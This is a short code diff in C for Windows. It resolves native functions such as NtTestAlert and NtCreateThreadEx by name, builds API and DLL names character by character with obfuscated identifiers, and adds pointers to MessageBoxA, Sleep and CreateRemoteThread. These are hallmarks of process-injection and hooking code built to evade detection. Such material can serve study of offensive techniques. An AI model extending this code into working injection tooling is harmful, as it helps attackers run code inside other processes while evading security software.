@@ -43,3 +43,15 @@ myNtTestAlert testAlert = (myNtTestAlert)hlpGetProcAddress(dllModule, t3stAl3rt)
 
 char ThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
 myNtCreateThreadEx pRemoteThread = (myNtCreateThreadEx)hlpGetProcAddress(dllModule, ThreadEx);
+
+// pointer to original MessageBox
+int (WINAPI* pOrigMessageBox)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) = MessageBoxA;
+void (WINAPI* pOrigSleep)(DWORD dwMilliseconds) = Sleep;
+HANDLE (WINAPI* pCreateRemoteThread)(HANDLE                 hProcess, 
+									LPSECURITY_ATTRIBUTES  lpThreadAttributes, 
+									SIZE_T                 dwStackSize, 
+									LPTHREAD_START_ROUTINE lpStartAddress, 
+									LPVOID                 lpParameter, 
+									DWORD                  dwCreationFlags, 
+									LPDWORD                lpThreadId) = CreateRemoteThread;
+WCHAR us3r32[] = { 'U','S','E','R','3','2','.','D','L','L',0 };
